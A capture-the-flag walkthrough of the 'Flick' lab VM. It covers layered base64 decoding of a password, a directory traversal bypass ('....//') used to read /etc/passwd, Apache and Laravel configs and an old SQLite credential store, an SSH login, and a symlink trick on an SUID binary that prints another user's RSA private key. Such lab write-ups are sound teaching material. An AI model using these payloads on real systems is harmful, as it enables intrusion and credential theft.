-<pre><code class="bash">root@pwk:~# echo "Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSWFJteFZVMjA1VjAxV2JETlhhMk0xVmpKS1IySkVUbGhoTVhCUVZteFZlRll5VGtsalJtaG9UVmhDVVZacVFtRlpWMDE1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFkR05GWkZSTmF6RTFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1drWndWMDFFUlRGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm0xNFlVMHhXbk5YYlVaclVqQTFSMWRyV2xOVWJVcEdZMFZ3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMXdUMVF3TUhoalJscFlZbFZhY2xWcVFURlNNVlY1VFZSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwbGEzQklWbXBHVDJSV1ZuUmhSazVzWWxob1dGWnRNSGhPUm14V1RVaG9XR0pyTlZsWmJGWmhZMnhXYzFWclpGaGlSM1F6VjJ0U1UxWnJNWEpqUm1oV1RXNVNNMVpxU2t0V1ZrcFpXa1p3VjFKV2NIbFdWRUpoVkRKT2RGSnJaRmhpVjNoVVdWUk9RMWRHV25STlZFSlhUV3hHTlZaWE5VOVhSMHBJVld4c1dtSkhhRlJXTUZwVFZqRndSMVJ0ZUdsU2JYY3hWa1phVTFVeFduSk5XRXBxVWxkNGFGVXdhRU5UUmxweFUydGFiRlpzV2xwWGExcDNZa2RGZWxGcmJGZFdNMEpJVmtSS1UxWXhWblZWYlhCVFlrVndWVlp0ZUc5Uk1XUnpWMjVLV0dKSFVtOVVWbHBYVGxaYVdHVkhkR2hpUlhBd1dWVm9UMVp0Um5KT1ZsSlhUVlp3V0ZreFdrdGpiVkpIVld4a2FWSnRPVE5XTW5oWFlqSkZlRmRZWkU1V1ZscFVXV3RrVTFsV1VsWlhiVVpzWWtad2VGVXlkREJXTVZweVYyeHdXbFpXY0hKV1ZFWkxWMVpHY21KR1pGZE5NRXBKVm10U1MxVXhXWGhhU0ZaVllrWktjRlpxVG05V1ZscEhXVE5vYVUxWFVucFdNV2h2V1ZaS1IxTnVRbFZXTTFKNlZHdGFhMk5zV25Sa1JtUnBWbGhDTlZkVVFtRmpNV1IwVTJ0a1dHSlhhR0ZVVmxwM1pXeHJlV1ZIZEd0U2EzQXdXbFZhYTJGV1duSmlla1pYWWxoQ1RGUnJXbEpsUm1SellVWlNhVkp1UWxwV2JYUlhaREZrUjJKSVRtaFNWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm5OWGJGcFhZMGhLV2xaWFVrZGFWV1JQVTBkR1IyRkhiRk5pYTBwMlZtMTBVMU14VVhsVVdHeFZZVEZ3YUZWcVNtOVdSbEpZVGxjNWEySkdjRWhXYlRBMVZXc3hXRlZzYUZkTlYyaDJWakJrUzFkV1ZuSlBWbHBvWVRGd1NWWkhlR0ZaVm1SR1RsWmFVRll5YUZoWldIQlhVMFphY1ZOcVVsWk5WMUl3VlRKMGIyRkdTbk5UYkdoVlZsWndNMVpyV21GalZrcDBaRWQwVjJKclNraFdSM2hoVkRKR1YxTnVVbEJXUlRWWVdWUkdkMkZHV2xWU2ExcHNVbTFTZWxsVldsTmhSVEZaVVc1b1YxWXphSEpaYWtaclVqRldjMkZGT1ZkV1ZGWmFWbGN4TkdReVZrZFdibEpyVWtWS2IxbFljRWRsVmxKelZtMDVXR0pHY0ZoWk1HaExWMnhhV0ZWclpHRldNMmhJV1RJeFMxSXhjRWRhUms1WFYwVktNbFp0Y0VkWlYwVjRWbGhvV0ZkSGFGWlpiWGhoVm14c2NsZHJkR3BTYkZwNFZXMTBNRll4V25OalJXaFhWak5TVEZsVVFYaFNWa3B6Vkd4YVUySkZXWHBXVlZwR1QxWkNVbEJVTUQwPQ==" | base64 -d
-Vm0wd2QyUXlVWGxWV0d4V1YwZDRXRmxVU205V01WbDNXa2M1VjJKR2JETlhhMXBQVmxVeFYyTkljRmhoTVhCUVZqQmFZV015U2tWVWJHaG9UVlZ3VlZadGNFZFRNazE1VTJ0V1ZXSkhhRzlVVjNOM1pVWmFkR05GWkZwV01ERTFWVEowVjFaWFNraGhSemxWVm14YU0xWnNXbUZrUjA1R1drWlNUbUpGY0VwV2JURXdZekpHVjFOdVVtaFNlbXhXVm1wT1QwMHhjRlpYYlVaclVqQTFSMVV5TVRSVk1rcFhVMnR3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMHhORmxWTUhoWGJrNVlZbFZhY2xWc1VrZFhiR3QzV2tSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwV1JWcHlWVEJhVDJOdFJrZFhiV3hUWVROQ1dGWnRNVEJXTWxGNVZXNU9XR0pIVWxsWmJHaFRWMFpTVjFwR1RteGlSbXcxVkZaU1UxWnJNWEpqUld4aFUwaENTRlpxU2tabFZsWlpXa1p3YkdFelFrbFdWM0JIVkRKU1YxVnVVbXBTYkVwVVZteG9RMWRzV25KWGJHUm9UVlpXTlZaWGVHdGhiRXAwWVVoT1ZtRnJOVlJXTVZwWFkxWktjbVJHVWxkaVJtOTNWMnhXYjJFeFdYZE5WVlpUWWtkU1lWUlZXbUZsYkZweFUydDBWMVpyV2xwWlZWcHJWVEZLV1ZGcmJGZFdNMEpJVmtSS1UxWXhaSFZVYkZKcFZqTm9WVlpHWTNoaU1XUnpWMWhvWVZKR1NuQlVWM1J6VGtaa2NsWnRkRmRpVlhCNVdUQmFjMWR0U2tkWGJXaGFUVlp3ZWxreWVHdGtSa3AwWlVaa2FWWnJiekZXYlhCTFRrWlJlRmRzYUZSaVJuQlpWbXRXZDFkR2JITmhSVTVZVW14d2VGVnRkREJoYXpGeVRsVnNXbFpXY0hKWlZXUkdaVWRPU0dGR2FHbFNia0p2Vm10U1MxUXlUWGxVYTFwaFVqSm9WRlJYTlc5a2JGcEhWbTA1VWsxWFVsaFdNV2h2VjBkS1dWVnJPVlpoYTFwSVZHeGFZVmRGTlZaUFYyaFhZWHBXU0ZacVNqUlZNV1IwVTJ0b2FGSnNTbGhVVlZwM1ZrWmFjVkp0ZEd0V2JrSkhWR3hhVDJGV1NuUlBWRTVYWVRGd2FGWlVSa1psUm1SellVWlNhRTFZUW5oV1YzaHJZakZrUjFWc2FFOVdWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm05WGJGcFhZMGhLV2xaWFVrZGFWM2hIWTIxS1IxcEdaRk5XV0VKMlZtcEdZV0V4VlhoWFdHaFZZbXhhVmxscldrdGpSbFp4VW10MFYxWnNjRWhXVjNSTFlUQXhSVkpzVGxaU2JFWXpWVVpGT1ZCUlBUMD0=
-root@pwk:~#
-</code></pre>
-
-<p>More base64&hellip; OK, decode again</p>
-
-<pre><code class="bash">echo "Vm0wd2QyUXlVWGxWV0d4V1YwZDRXRmxVU205V01WbDNXa2M1VjJKR2JETlhhMXBQVmxVeFYyTkljRmhoTVhCUVZqQmFZV015U2tWVWJHaG9UVlZ3VlZadGNFZFRNazE1VTJ0V1ZXSkhhRzlVVjNOM1pVWmFkR05GWkZwV01ERTFWVEowVjFaWFNraGhSemxWVm14YU0xWnNXbUZrUjA1R1drWlNUbUpGY0VwV2JURXdZekpHVjFOdVVtaFNlbXhXVm1wT1QwMHhjRlpYYlVaclVqQTFSMVV5TVRSVk1rcFhVMnR3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMHhORmxWTUhoWGJrNVlZbFZhY2xWc1VrZFhiR3QzV2tSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwV1JWcHlWVEJhVDJOdFJrZFhiV3hUWVROQ1dGWnRNVEJXTWxGNVZXNU9XR0pIVWxsWmJHaFRWMFpTVjFwR1RteGlSbXcxVkZaU1UxWnJNWEpqUld4aFUwaENTRlpxU2tabFZsWlpXa1p3YkdFelFrbFdWM0JIVkRKU1YxVnVVbXBTYkVwVVZteG9RMWRzV25KWGJHUm9UVlpXTlZaWGVHdGhiRXAwWVVoT1ZtRnJOVlJXTVZwWFkxWktjbVJHVWxkaVJtOTNWMnhXYjJFeFdYZE5WVlpUWWtkU1lWUlZXbUZsYkZweFUydDBWMVpyV2xwWlZWcHJWVEZLV1ZGcmJGZFdNMEpJVmtSS1UxWXhaSFZVYkZKcFZqTm9WVlpHWTNoaU1XUnpWMWhvWVZKR1NuQlVWM1J6VGtaa2NsWnRkRmRpVlhCNVdUQmFjMWR0U2tkWGJXaGFUVlp3ZWxreWVHdGtSa3AwWlVaa2FWWnJiekZXYlhCTFRrWlJlRmRzYUZSaVJuQlpWbXRXZDFkR2JITmhSVTVZVW14d2VGVnRkREJoYXpGeVRsVnNXbFpXY0hKWlZXUkdaVWRPU0dGR2FHbFNia0p2Vm10U1MxUXlUWGxVYTFwaFVqSm9WRlJYTlc5a2JGcEhWbTA1VWsxWFVsaFdNV2h2VjBkS1dWVnJPVlpoYTFwSVZHeGFZVmRGTlZaUFYyaFhZWHBXU0ZacVNqUlZNV1IwVTJ0b2FGSnNTbGhVVlZwM1ZrWmFjVkp0ZEd0V2JrSkhWR3hhVDJGV1NuUlBWRTVYWVRGd2FGWlVSa1psUm1SellVWlNhRTFZUW5oV1YzaHJZakZrUjFWc2FFOVdWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm05WGJGcFhZMGhLV2xaWFVrZGFWM2hIWTIxS1IxcEdaRk5XV0VKMlZtcEdZV0V4VlhoWFdHaFZZbXhhVmxscldrdGpSbFp4VW10MFYxWnNjRWhXVjNSTFlUQXhSVkpzVGxaU2JFWXpWVVpGT1ZCUlBUMD0=" | base64 -d
-Vm0wd2QyUXlVWGxWV0d4WFlUSm9WMVl3Wkc5V2JGbDNXa1pPVlUxV2NIcFhhMXBQVjBaYWMySkVUbGhoTVVwVVZtcEdTMk15U2tWVWJHaG9UV3N3ZUZadGNFZFpWMDE1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFkR05GWkZSTmJFcEpWbTEwYzJGV1NuUmhSemxWVmpOT00xcFZXbUZrUjA1R1UyMTRVMkpXU2twV2JURXdZekpHVjFOdVVtaFNlbXhXVm0xNFlVMHhXbk5YYlVaclVsUkdXbGt3WkRSVk1rcFhVMnR3VjJKVVJYZFpWRVpyVTBaT2NtRkdXbWxTYTNCWFZtMTBWMlF5VW5OWGJHUllZbGhTV0ZSV1pGTmxiRmw1VFZSU1ZrMXJjRWxhU0hCSFZqSkZlVlZZWkZwbGEzQklWV3BHVDJSV1VuUmpSbEpUVmxoQ1dsWnJXbGRoTVZWNVZXeGthbEp0YUhOVmFrNVRWMVpXY1ZKcmRGUldiRm93V2xWb2ExWXdNVVZTYkdSYVRVWmFlbFpxU2t0V1ZrWlpZVVprVTFKWVFrbFdWM0JIVkRKU1YxZHVUbFJpVjNoVVZGY3hiMWRzV1hoYVJGSnBUV3RzTkZkclZtdFdiVXB5WTBac1dtSkdXbWhaTVZwelkyeGtkRkp0ZUZkaVZrbzFWbXBLTkZReFdsaFRiRnBZVmtWd1dGbHNhRU5YUmxweFVtdDBhazFyTlVsWlZWcHJZVWRGZUdOSGFGaGlSbkJvVmtSS1QyTXlUa1phUjJoVFRXNW9kbFpHVm05Uk1XUlhWMWhvV0dKWVVrOVZha1pIVGxaYVdFNVZPV2hXYXpWSFZqSjRVMWR0U2toaFJsSlhUVVp3VkZacVJtdGtWbkJHVGxaT2FWSnRPVE5XYTFwaFZURkZlRmRzYUZSaE1YQnhWV3hrYjFkR1VsaE9WVTVZVW14d2VGVnRkREJoYXpGeVRsVm9XbFpXY0hKWlZXUkdaV3hHY21KR1pGZFNWWEJ2VmpGYWExVXhXWGhVYmxaVllrWktjRlZxUmt0V1ZscEhWV3RLYTAxRVJsTlZSbEYzVUZFOVBRPT0=
-root@pwk:~#
-</code></pre>
-
-<p><img src="http://d2tq98mqfjyz2l.cloudfront.net/image_cache/1308021750174814.gif" alt="" /></p>
-
-<p>Turns out you have to keep decoding the base64 about 13 more times until you end up with this</p>
-
-<pre><code class="bash">root@pwk:~# echo "dGFidXBKaWV2YXM4S25vag==" | base64 -d
-tabupJievas8Knoj
-root@pwk:~#
-</code></pre>
-
-<p>Which just so happens to be the password for the application runnning on port 8881</p>
-
-<pre><code class="bash">root@pwk:~# nc 192.168.0.106 8881
-Welcome to the admin server. A correct password will 'flick' the switch and open a new door:
-&gt; tabupJievas8Knoj
-OK: tabupJievas8Knoj
-
-Accepted! The door should be open now :poolparty:
-
-&gt; 
-</code></pre>
-
-<p>Another NMAP scan now indicates that port 80 is open. Let us take a look.</p>
-
-<hr />
-
-<h2>The Internet is Made of Cats</h2>
-
-<p>Looking at the site hosted by the website kinda stops me in my tracks. KITTENS !!! YAY !!!</p>
-
-<p><a href="/images/flick_001.png"><img src="/images/flick_001.png" alt="flick_001" /></a></p>
-
-<p>You can log in with the credentials of demo:demo123 on the login page to give you the ability to upload images (note here, it allows you to upload absolutely anything).</p>
-
-<p><a href="/images/flick_002.png"><img src="/images/flick_002.png" alt="flick_002" /></a></p>
-
-<p><a href="/images/flick_003.png"><img src="/images/flick_003.png" alt="flick_003" /></a></p>
-
-<p>I figured that the upload feature was the vulnerability and worked on uploading PHP shells etc, but I was not able to get any PHP to execute. Maybe it&rsquo;s not the <strong>up</strong>load feature that&rsquo;s useful, maybe it&rsquo;s the <strong>down</strong>load feature ? The download feature will present you with a file, called image.jpg, of the file you&rsquo;re requesting. Turns out you can request any file on the filesystem if you bypass the directory traversal filter (same way as with Hell, using &hellip;.// instead of ../). Requesting the following</p>
-
-<pre><code class="bash">http://192.168.0.106/image/download?filename=....//....//....//....//....//etc/passwd
-</code></pre>
-
-<p>results in an &ldquo;image.jpg&rdquo; file which needs to be catted to view the contents of /etc/passwd as text.</p>
-
-<pre><code class="bash">root@pwk:~# mv image.jpg flick_passwd
-root@pwk:~# cat flick_passwd
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/bin/sh
-bin:x:2:2:bin:/bin:/bin/sh
-sys:x:3:3:sys:/dev:/bin/sh
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/bin/sh
-man:x:6:12:man:/var/cache/man:/bin/sh
-lp:x:7:7:lp:/var/spool/lpd:/bin/sh
-mail:x:8:8:mail:/var/mail:/bin/sh
-news:x:9:9:news:/var/spool/news:/bin/sh
-uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
-proxy:x:13:13:proxy:/bin:/bin/sh
-www-data:x:33:33:www-data:/var/www:/bin/sh
-backup:x:34:34:backup:/var/backups:/bin/sh
-list:x:38:38:Mailing List Manager:/var/list:/bin/sh
-irc:x:39:39:ircd:/var/run/ircd:/bin/sh
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
-nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
-libuuid:x:100:101::/var/lib/libuuid:/bin/sh
-syslog:x:101:103::/home/syslog:/bin/false
-messagebus:x:102:105::/var/run/dbus:/bin/false
-whoopsie:x:103:106::/nonexistent:/bin/false
-landscape:x:104:109::/var/lib/landscape:/bin/false
-sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
-robin:x:1000:1000:robin,,,:/home/robin:/bin/bash
-mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
-dean:x:1001:1001:,,,:/home/dean:/bin/bash
-root@pwk:~#
-</code></pre>
-
-<p>Hmm, with this I can request pretty much anything, right ? If a folder or file exists, it gives me a download dialog, if the file does not exist, it gives me an error. This is blind filesystem traversal.</p>
-
-<p><img src="http://media.tumblr.com/tumblr_lg3vooHJ7B1qac925.gif" alt="" /></p>
-
-<p>Firstly I needed to find out the DocumentRoot from the Apache</p>
-
-<p>So, I figured I wanted some credentials - and started by trying to get MySQL credentials from the application. A bit of googling determined that the application was <a href="http://getbootstrap.com/">Bootstrap</a> on top of <a href="https://github.com/laravel/laravel">Laravel</a>.  Firstly I requested the following URL to get the apache configuration.</p>
-
-<pre><code class="bash">http://192.168.0.106/image/download?filename=....//....//....//....//....//etc/apache2/apache.conf
-</code></pre>
-
-<p>which pointed me towards the sites-enabled folder. A bit of googling told me that sites-enabled is just full of symlinks to files in sites-available, so I grabbed the default file</p>
-
-<pre><code class="bash">http://192.168.0.106/image/download?filename=....//....//....//....//....//etc/apache2/sites-available/default
-</code></pre>
-
-<pre><code class="xml">&lt;VirtualHost *:80&gt;
-    ServerAdmin webmaster@localhost
-
-    DocumentRoot /var/www/flick_photos/public
-    &lt;Directory /&gt;
-        Options FollowSymLinks
-        AllowOverride None
-    &lt;/Directory&gt;
-    &lt;Directory /var/www/flick_photos/public&gt;
-        Options Indexes FollowSymLinks MultiViews
-        AllowOverride All
-        Order allow,deny
-        allow from all
-    &lt;/Directory&gt;
-
-    ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
-    &lt;Directory "/usr/lib/cgi-bin"&gt;
-        AllowOverride None
-        Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
-        Order allow,deny
-        Allow from all
-    &lt;/Directory&gt;
-
-    ErrorLog ${APACHE_LOG_DIR}/error.log
-
-    # Possible values include: debug, info, notice, warn, error, crit,
-    # alert, emerg.
-    LogLevel warn
-
-    CustomLog ${APACHE_LOG_DIR}/access.log combined
-
-    Alias /doc/ "/usr/share/doc/"
-    &lt;Directory "/usr/share/doc/"&gt;
-        Options Indexes MultiViews FollowSymLinks
-        AllowOverride None
-        Order deny,allow
-        Deny from all
-        Allow from 127.0.0.0/255.0.0.0 ::1/128
-    &lt;/Directory&gt;
-
-&lt;/VirtualHost&gt;
-</code></pre>
-
-<p>Our DocumentRoot is /var/www/flick_photos/public, so we now know our base path. Using the Laravel github repo as a directional aid, I found out the database config file is located in app/config/database.php, so</p>
-
-<pre><code class="bash">http://192.168.0.106/image/download?filename=....//....//....//....//....//var/www/flick_photos/app/config/database.php
-</code></pre>
-
-<p>catting this image.jpg file does indeed show us credentials for MySQL, but there&rsquo;s something more interesting</p>
-
-<pre><code class="php">&lt;?php
-
-return array(
-
-    /*
-    |--------------------------------------------------------------------------
-    | PDO Fetch Style
-    |--------------------------------------------------------------------------
-    |
-    | By default, database results will be returned as instances of the PHP
-    | stdClass object; however, you may desire to retrieve records in an
-    | array format for simplicity. Here you can tweak the fetch style.
-    |
-    */
-
-    'fetch' =&gt; PDO::FETCH_CLASS,
-
-    /*
-    |--------------------------------------------------------------------------
-    | Default Database Connection Name
-    |--------------------------------------------------------------------------
-    |
-    | Here you may specify which of the database connections below you wish
-    | to use as your default connection for all database work. Of course
-    | you may use many connections at once using the Database library.
-    |
-    */
-
-    // Jan 2014 note: We have moved away from the old crappy SQLite 2.x database and moved
-    // on to the new and improved MySQL database. So, I will just comment out this as it is
-    // no longer in use
-
-    //'default' =&gt; 'sqlite',
-    'default' =&gt; 'mysql',
-
-    /*
-    |--------------------------------------------------------------------------
-    | Database Connections
-    |--------------------------------------------------------------------------
-    |
-    | Here are each of the database connections setup for your application.
-    | Of course, examples of configuring each database platform that is
-    | supported by Laravel is shown below to make development simple.
-    |
-    |
-    | All database work in Laravel is done through the PHP PDO facilities
-    | so make sure you have the driver for your particular database of
-    | choice installed on your machine before you begin development.
-    |
-    */
-
-    'connections' =&gt; array(
-
-        'sqlite' =&gt; array(
-            'driver'   =&gt; 'sqlite',
-            'database' =&gt; __DIR__.'/../database/production.sqlite', // OLD DATABASE NO LONGER IN USE!
-            'prefix'   =&gt; '',
-        ),
-
-        'mysql' =&gt; array(
-            'driver'    =&gt; 'mysql',
-            'host'      =&gt; 'localhost',
-            'database'  =&gt; 'flick',
-            'username'  =&gt; 'flick',
-            'password'  =&gt; 'resuddecNeydmar3',
-            'charset'   =&gt; 'utf8',
-            'collation' =&gt; 'utf8_unicode_ci',
-            'prefix'    =&gt; '',
-        ),
-
-        'pgsql' =&gt; array(
-            'driver'   =&gt; 'pgsql',
-            'host'     =&gt; 'localhost',
-            'database' =&gt; 'forge',
-            'username' =&gt; 'forge',
-            'password' =&gt; '',
-            'charset'  =&gt; 'utf8',
-            'prefix'   =&gt; '',
-            'schema'   =&gt; 'public',
-        ),
-
-        'sqlsrv' =&gt; array(
-            'driver'   =&gt; 'sqlsrv',
-            'host'     =&gt; 'localhost',
-            'database' =&gt; 'database',
-            'username' =&gt; 'root',
-            'password' =&gt; '',
-            'prefix'   =&gt; '',
-        ),
-
-    ),
-
-    /*
-    |--------------------------------------------------------------------------
-    | Migration Repository Table
-    |--------------------------------------------------------------------------
-    |
-    | This table keeps track of all the migrations that have already run for
-    | your application. Using this information, we can determine which of
-    | the migrations on disk haven't actually been run in the database.
-    |
-    */
-
-    'migrations' =&gt; 'migrations',
-
-    /*
-    |--------------------------------------------------------------------------
-    | Redis Databases
-    |--------------------------------------------------------------------------
-    |
-    | Redis is an open source, fast, and advanced key-value store that also
-    | provides a richer set of commands than a typical key-value systems
-    | such as APC or Memcached. Laravel makes it easy to dig right in.
-    |
-    */
-
-    'redis' =&gt; array(
-
-        'cluster' =&gt; false,
-
-        'default' =&gt; array(
-            'host'     =&gt; '127.0.0.1',
-            'port'     =&gt; 6379,
-            'database' =&gt; 0,
-        ),
-
-    ),
-
-);
-</code></pre>
-
-<p>This line is what we need to be focusing on</p>
-
-<pre><code class="php">database' =&gt; __DIR__.'/../database/production.sqlite', // OLD DATABASE NO LONGER IN USE!
-</code></pre>
-
-<p>which would indicate that the app previously used SQLite, and switched to MySQL. There&rsquo;s a file I need to get my hands on !</p>
-
-<pre><code class="bash">http://192.168.0.106/image/download?filename=....//....//....//....//var/www/flick_photos/app/database/production.sqlite
-</code></pre>
-
-<p><a href="/images/flick_004.png"><img src="/images/flick_004.png" alt="flick_004" /></a></p>
-
-<p>Yes !  Once I renamed the file and installed SQLite tools onto my Kali VM, I was able to wander around the database to get some username and password combos</p>
-
-<pre><code class="bash">root@pwk:~# mv image.jpg production.sqlite
-root@pwk:~# apt-get install sqlite
-Blah blah, install blah.
-root@pwk:~# sqlite production.sqlite
-SQLite version 2.8.17
-Enter ".help" for instructions
-sqlite&gt; .databases
-seq  name             file
----  ---------------  ----------------------------------------------------------
-0    main             /root/Downloads/production.sqlite
-1    temp             /var/tmp/sqlite_pUdaqDiGqjXzPPF
-sqlite&gt; .tables
-old_users
-sqlite&gt; .dump old_users
-BEGIN TRANSACTION;
-CREATE TABLE old_users (
-  username text,
-  password text
-);
-INSERT INTO old_users VALUES('paul','nejEvOibKugEdof0KebinAw6TogsacPayarkOctIasejbon7Ni7Grocmyalkukvi');
-INSERT INTO old_users VALUES('robin','JoofimOwEakpalv4Jijyiat5GloonTojatticEirracksIg4yijovyirtAwUjad1');
-INSERT INTO old_users VALUES('james','scujittyukIjwip0zicjoocAnIltAsh4Vuer4osDidsaiWipOkDunipownIrtOb5');
-INSERT INTO old_users VALUES('dean','FumKivcenfodErk0Chezauggyokyait5fojEpCayclEcyaj2heTwef0OlNiphAnA');
-COMMIT;
-sqlite&gt;
-</code></pre>
-
-<p>I know that the users Robin and Dean exist, so I decided to try the above passwords</p>
-
-<pre><code class="bash">root@pwk:~# ssh robin@192.168.0.106
-
- .o88o. oooo   o8o            oooo
- 888 `" `888   `"'            `888
-o888oo   888  oooo   .ooooo.   888  oooo
- 888     888  `888  d88' `"Y8  888 .8P'
- 888     888   888  888        888888.
- 888     888   888  888   .o8  888 `88b.
-o888o   o888o o888o `Y8bod8P' o888o o888o 
-
-robin@192.168.0.106's password: JoofimOwEakpalv4Jijyiat5GloonTojatticEirracksIg4yijovyirtAwUjad1
-Permission denied, please try again.
-robin@192.168.0.106's password: ^C
-root@pwk:~# ssh dean@192.168.0.106
-
- .o88o. oooo   o8o            oooo
- 888 `" `888   `"'            `888
-o888oo   888  oooo   .ooooo.   888  oooo
- 888     888  `888  d88' `"Y8  888 .8P'
- 888     888   888  888        888888.
- 888     888   888  888   .o8  888 `88b.
-o888o   o888o o888o `Y8bod8P' o888o o888o 
-
-dean@192.168.0.106's password: FumKivcenfodErk0Chezauggyokyait5fojEpCayclEcyaj2heTwef0OlNiphAnA
-Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com/
-
-  System information as of Wed Aug 13 00:18:03 SAST 2014
-
-  System load:  0.0               Processes:              87
-  Usage of /:   39.7% of 6.99GB   Users logged in:        0
-  Memory usage: 49%               IP address for eth0:    192.168.0.106
-  Swap usage:   1%                IP address for docker0: 172.17.42.1
-
-  Graph this data and manage this system at:
-    https://landscape.canonical.com/
-
-79 packages can be updated.
-51 updates are security updates.
-
-New release '14.04.1 LTS' available.
-Run 'do-release-upgrade' to upgrade to it.
-
-Last login: Wed Aug 13 00:16:41 2014 from 192.168.0.110
-dean@flick:~$ 
-</code></pre>
-
-<p>OK, we&rsquo;re in. Let the fun continue.</p>
-
-<hr />
-
-<h2>Dean Covers While Robin&rsquo;s on Holiday</h2>
-
-<p>Dean&rsquo;s home folder includes two files - a message text file and a binary called read_docker with the SUID bit set as the robin user.</p>
-
-<pre><code class="bash">dean@flick:~$ ls -l
-total 16
--rw-r--r-- 1 root  root  1250 Aug  4 12:56 message.txt
--rwsr-xr-x 1 robin robin 8987 Aug  4 14:45 read_docker
-dean@flick:~$ 
-</code></pre>
-
-<p>The message file tells us that Robin is away on holiday, and that the admin guys will allow Dean access to his dockerfile in his home directory.</p>
-
-<pre><code class="text">-----BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
-
-Hi Dean,
-
-I will be away on leave for the next few weeks. I have asked the admin guys to
-write a quick script that will allow you to read my .dockerfile for flick-
-a-photo so that you can continue working in my absense.
-
-The .dockerfile is in my home, so the path for the script will be something like
-/home/robin/flick-dev/
-
-Please call me if you have any troubles!
-
-- --
-Ciao
-Robin
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
-
-iQIcBAEBAgAGBQJT32ZsAAoJENRCTh/agc2DTNIP/0+ut1jWzk7VgJlT6tsGB0Ah
-yi24i2b+JAVtINzCNgJ+rXUStaAEudTvJDF28b/wZCaFVFoNJ8Q30J03FXo4SRnA
-ZW6HZZIGEKdlD10CcXsQrLMRmWZlBDQnCm4+EMOvavS1uU9gVvcaYhnow6uwZlwR
-enf71LvtS1h0+PrFgSIoItBI4/lx7BiYY9o3hJyaQWkmAZsZLWQpJtROe8wsxb1l
-9o4jCJrADeJBsYM+xLExsXaEobHfKtRtsM+eipHXIWIH+l+xTi8Y1/XIlgEHCelU
-jUg+Hswq6SEch+1T5B+9EPoeiLT8Oi2Rc9QePSZ3n0fe4f3WJ47lEYGLLEUrKNG/
-AFLSPnxHTVpHNO72KJSae0cG+jpj1OKf3ErjdTk1PMJy75ntQCrgtnGnp9xvpk0b
-0xg6cESLGNkrqDGopsN/mgi6+2WKtUuO5ycwVXFImY3XYl+QVZgd/Ntpu4ZjyZUT
-lxqCAk/G1s43s+ySFKSoHZ8c/CuOKTsyn6uwI3NxBZPD04xfzoc0/R/UpIpUmneK
-q9LddBQK4vxPab8i4GNDiMp+KXyfByO864PtKQnCRkGQewanxoN0lmjB/0eKhkmf
-Yer1sBmumWjjxR8TBY3cVRMH93zpIIwqxRNOG6bnnSVzzza5DJuNssppCmXLOUL9
-nZAuFXkGFu6cMMD4rDXQ
-=2moZ
------END PGP SIGNATURE-----
-</code></pre>
-
-<p>Looks like they tried to be clever and made the binary instead. So, what does this binary do ? It seems to just read any file called &ldquo;dockerfile&rdquo; from the directory you provide.</p>
-
-<pre><code class="bash">dean@flick:~$ ./read_docker /home/robin
-ERROR: the specified docker file doesn't exist: /home/robin/Dockerfile
-Usage is: ./read_docker /path/to/dockerfile
-dean@flick:~$ ./read_docker /home/robin/flick-dev
-# Flick-a-photo dev env
-RUN apt-get update &amp;&amp; apt-get install -y php5 libapache2-mod-php5 php5-mysql php5-cli &amp;&amp; apt-get clean &amp;&amp; rm -rf /var/lib/apt/lists/*
-
-CMD ["/usr/sbin/apache2", "-D", "FOREGROUND"]
-dean@flick:~$ 
-</code></pre>
-
-<p>After messing around reading files I created in varying directories, I decided to fool the application into reading a symlink to an arbitrary file on the filesystem - my first attempt was /home/robin/.ssh/id_rsa. Might as well start somewhere, right ? I was fully expecting this to fail, as I had no idea if the target file actually existed.</p>
-
-<pre><code class="bash">dean@flick:~$ ln -s /home/robin/.ssh/id_rsa /home/dean/Dockerfile
-dean@flick:~$ ls -l
-total 16
-lrwxrwxrwx 1 dean  dean    23 Aug 11 23:10 Dockerfile -&gt; /home/robin/.ssh/id_rsa
--rw-r--r-- 1 root  root  1250 Aug  4 12:56 message.txt
--rwsr-xr-x 1 robin robin 8987 Aug  4 14:45 read_docker
-dean@flick:~$ ./read_docker ./
------BEGIN RSA PRIVATE KEY-----
-MIIEowIBAAKCAQEAlv/0uKdHFQ4oT06Kp3yg0tL1fFVl4H+iS1UOqds0HrgBCTSw
-ECwVwhrIFJa/u5FOPGst8t35CKo4VWX3KNHXFNVtUXWeQFpe/rB/0wi+k8E8WtXi
-FBjLiFOqTDL0kgXRoQzUPlYg0+LAXo5EbMq+rB2ZgMJTxunJFV2m+uKtbZZRvzU6
-S1Fj6XHh/U0E68d6sZ/+y1UhSJLaFYUQMkfLtjxPa17sPZ+kwB1R4puhVTprfQOk
-CinfW01ot2Rj2HLMR5CpgA28dmxw8W6w0MGtXurTegj1ydFOTgB1/k4XpXnSGNO9
-d2AlVR/NsKDAuYKdgRGFFh91nGZTl1p4em48YwIDAQABAoIBADI3bwhVwSL0cV1m
-jmAC520VcURnFhlh+PQ6lkTQvHWW1elc10yZjKbfxzhppdvYB/+52S8SuPYzvcZQ
